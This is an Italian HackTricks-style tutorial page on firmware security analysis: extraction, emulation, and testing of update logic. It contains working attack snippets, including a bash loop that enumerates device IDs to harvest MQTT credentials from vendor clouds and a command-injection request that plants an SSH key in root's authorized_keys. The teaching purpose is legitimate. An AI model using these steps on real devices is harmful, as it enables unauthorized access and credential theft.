# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware è il software essenziale che permette ai dispositivi di funzionare correttamente gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. È memorizzato in memoria permanente, garantendo che il dispositivo possa accedere a istruzioni vitali dal momento dell'accensione, portando all'avvio del sistema operativo. Esaminare e potenzialmente modificare il firmware è un passo critico per identificare vulnerabilità di sicurezza.

## **Raccolta delle informazioni**

La **raccolta delle informazioni** è una fase iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo comporta la raccolta di dati su:

- L'architettura CPU e il sistema operativo su cui gira
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e ubicazione delle sorgenti
- Librerie esterne e tipi di licenza
- Storico degli aggiornamenti e certificazioni regolamentari
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità identificate

A tal fine, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di qualsiasi componente software open-source disponibile tramite processi di revisione manuale e automatizzata. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statiche gratuite che possono essere sfruttate per trovare potenziali problemi.

## **Acquisizione del firmware**

Ottenere il firmware può essere affrontato attraverso vari mezzi, ognuno con il proprio livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Costruirlo** dalle istruzioni fornite
- **Scaricarlo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente a **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG**, o **PICit**
- **Sniffing** per richieste di aggiornamento nella comunicazione del dispositivo
- Identificare e utilizzare **hardcoded update endpoints**
- **Dumping** dal bootloader o dalla rete
- **Rimuovere e leggere** il chip di storage, quando tutto il resto fallisce, usando strumenti hardware appropriati

## Analisi del firmware

Ora che **hai il firmware**, è necessario estrarre informazioni su di esso per sapere come trattarlo. Diversi strumenti che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quegli strumenti controlla l'**entropia** dell'immagine con `binwalk -E <bin>`, se l'entropia è bassa, allora probabilmente non è cifrata. Se l'entropia è alta, è probabile che sia cifrata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre i **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il Filesystem

Con gli strumenti precedentemente menzionati come `binwalk -ev <bin>` dovresti essere stato in grado di **estrarre il filesystem**.\
Binwalk di solito lo estrae all'interno di una **cartella nominata come il tipo di filesystem**, che solitamente è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte, binwalk **non contiene il magic byte del filesystem nelle sue signature**. In questi casi, usa binwalk per **trovare l'offset del filesystem e ritagliare il filesystem compresso** dal binario ed **estrarre manualmente** il filesystem in base al suo tipo usando i passaggi sotto.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** per il carving del filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, il seguente comando può anche essere eseguito.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

I file saranno nella directory `squashfs-root` successivamente.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo comporta l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di analisi iniziale

Di seguito è fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare i dati binari e comprendere i dettagli di partizione e filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di cifratura dell'immagine, si verifica la **entropia** con `binwalk -E <bin>`. Bassa entropia suggerisce assenza di cifratura, mentre entropia elevata indica possibile cifratura o compressione.

Per l'estrazione dei **file incorporati**, sono raccomandati strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Usando `binwalk -ev <bin>`, normalmente è possibile estrarre il filesystem, spesso in una directory chiamata come il tipo di filesystem (es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza dei magic bytes, è necessaria un'estrazione manuale. Questo comporta l'uso di `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per estrarre il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Dopodiché, a seconda del tipo di filesystem (es., squashfs, cpio, jffs2, ubifs), vengono usati comandi diversi per estrarre manualmente i contenuti.

### Analisi del filesystem

Con il filesystem estratto, inizia la ricerca di vulnerabilità di sicurezza. Si presta attenzione a network daemons insicuri, hardcoded credentials, endpoint API, funzionalità del server di aggiornamento, codice non compilato, script di avvio e binari compilati per analisi offline.

I percorsi e gli elementi chiave da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per possibili vulnerabilità
- Binaries embedded per ulteriori analisi
- Web server comuni dei dispositivi IoT e binari associati

Diversi strumenti aiutano a scoprire informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per analisi firmware complete
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statiche e dinamiche

### Controlli di sicurezza sui binari compilati

Sia il source code sia i binari compilati trovati nel filesystem devono essere esaminati per vulnerabilità. Strumenti come **checksec.sh** per binari Unix e **PESecurity** per binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Molti hub IoT recuperano la configurazione per dispositivo da un endpoint cloud che assomiglia a:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante l'analisi del firmware potresti trovare che <token> viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, per esempio:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Questo design consente a chiunque venga a conoscenza di deviceId e STATIC_KEY di ricostruire l'URL e scaricare la cloud config, rivelando spesso credenziali MQTT in chiaro e prefissi di topic.

Flusso di lavoro pratico:

1) Estrarre deviceId dai log di boot UART

- Collegare un adattatore UART 3.3V (TX/RX/GND) e acquisire i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il pattern dell'URL della cloud config e l'indirizzo del broker, ad esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recupera STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (es., MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e metti in maiuscolo il digest:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogli cloud config e credenziali MQTT

- Componi l'URL e preleva il JSON con curl; analizzalo con jq per estrarre i segreti:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusa di MQTT in chiaro e di ACLs deboli sui topic (se presenti)

- Usa le credenziali recuperate per iscriverti ai topic di manutenzione e cercare eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare gli ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/vendor/product/type seguiti da un suffisso sequenziale.
- Puoi iterare ID candidati, derivare token e recuperare le config programmaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottieni sempre autorizzazione esplicita prima di tentare mass enumeration.
- Preferisci emulation o static analysis per recuperare segreti senza modificare il target hardware quando possibile.

Il processo di emulating firmware consente la **dynamic analysis** sia del funzionamento di un dispositivo sia di un singolo programma. Questo approccio può incontrare sfide dovute a dipendenze hardware o di architecture, ma trasferire il root filesystem o specifici binaries su un dispositivo con matching architecture e endianness, come un Raspberry Pi, o su una pre-built virtual machine, può facilitare ulteriori test.

### Emulazione di singoli binaries

Per esaminare singoli programmi, identificare l'endianness del programma e la CPU architecture è cruciale.

#### Esempio con architettura MIPS

Per emulare un binary per architettura MIPS, è possibile usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian la scelta è `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM il processo è simile: si utilizza l'emulatore `qemu-arm`.

### Emulazione di sistema completo

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e altri facilitano l'emulazione completa del firmware, automatizzando il processo e supportando l'analisi dinamica.

## Analisi dinamica nella pratica

A questo stadio si utilizza un ambiente dispositivo reale o emulato per l'analisi. È fondamentale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo necessari riavvii dell'emulazione. L'analisi dovrebbe riesaminare il filesystem, sfruttare pagine web esposte e servizi di rete, ed esplorare vulnerabilità del bootloader. I test di integrità del firmware sono critici per identificare possibili backdoor.

## Tecniche di analisi a runtime

L'analisi a runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

## Binary Exploitation and Proof-of-Concept

Sviluppare un PoC per vulnerabilità identificate richiede una profonda comprensione dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni runtime dei binari nei sistemi embedded sono rare, ma quando presenti, tecniche come Return Oriented Programming (ROP) possono essere necessarie.

## Sistemi operativi preconfigurati per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per il testing di sicurezza del firmware, dotati degli strumenti necessari.

## OS pronti per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire security assessment and penetration testing di dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente pre-configurato con tutti gli strumenti necessari già caricati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo per security testing embedded basato su Ubuntu 18.04, pre-caricato con strumenti per il testing della sicurezza del firmware.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento insicuri

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, **la protezione contro il version rollback (downgrade) è spesso omessa**. Quando il bootloader o il recovery-loader verifica solo la firma con una chiave pubblica embedded ma non confronta la *versione* (o un contatore monotono) dell'immagine che viene flashata, un attaccante può legittimamente installare un **firmware più vecchio e vulnerabile che mantiene comunque una firma valida** e così reintrodurre vulnerabilità già corrette.

Flusso d'attacco tipico:

1. **Ottenere un'immagine firmata più vecchia**
   * Recuperala dal portale di download pubblico del vendor, dal CDN o dal sito di supporto.
   * Estrarla da applicazioni companion mobile/desktop (ad es. all'interno di un APK Android sotto `assets/firmware/`).
   * Recuperarla da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Caricare o servire l'immagine al dispositivo** tramite qualsiasi canale di aggiornamento esposto:
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * Molti dispositivi consumer IoT espongono endpoint HTTP(S) *unauthenticated* che accettano blob firmware codificati in Base64, li decodificano lato server e avviano recovery/upgrade.
3. Dopo il downgrade, sfruttare una vulnerabilità che era stata patchata nella release più recente (per esempio un filtro per command-injection aggiunto successivamente).
4. Facoltativamente riflashare l'immagine più recente o disabilitare gli aggiornamenti per evitare il rilevamento una volta ottenuta la persistenza.

### Esempio: Command Injection dopo il downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nella firmware vulnerabile (downgraded), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l'iniezione di comandi arbitrari (qui – abilitando l'accesso root basato su chiave SSH). Versioni successive del firmware hanno introdotto un filtro di caratteri di base, ma l'assenza di protezione contro il downgrade rende la correzione inefficace.

### Extracting Firmware From Mobile Apps

Molti fornitori includono immagini firmware complete all'interno delle loro applicazioni mobili companion in modo che l'app possa aggiornare il dispositivo via Bluetooth/Wi‑Fi. Questi pacchetti sono comunemente memorizzati non cifrati nell'APK/APEX sotto percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra`, o anche il semplice `unzip` permettono di estrarre immagini firmate senza toccare l'hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist per valutare la logica di aggiornamento

* Il trasporto/l'autenticazione dell'*update endpoint* è adeguatamente protetto (TLS + authentication)?
* Il dispositivo confronta **numeri di versione** o un **monotonic anti-rollback counter** prima del flashing?
* L'immagine viene verificata all'interno di una secure boot chain (es. le firme sono controllate dal codice ROM)?
* Il codice userland esegue ulteriori controlli di sanità (es. mappa delle partizioni consentite, model number)?
* I flussi di update *partial* o *backup* riutilizzano la stessa logica di validazione?

> 💡  Se uno qualsiasi dei punti precedenti manca, la piattaforma è probabilmente vulnerabile ad attacchi di rollback.

## Firmware vulnerabili per esercitarsi

Per esercitarsi a scoprire vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabili come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Training e Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
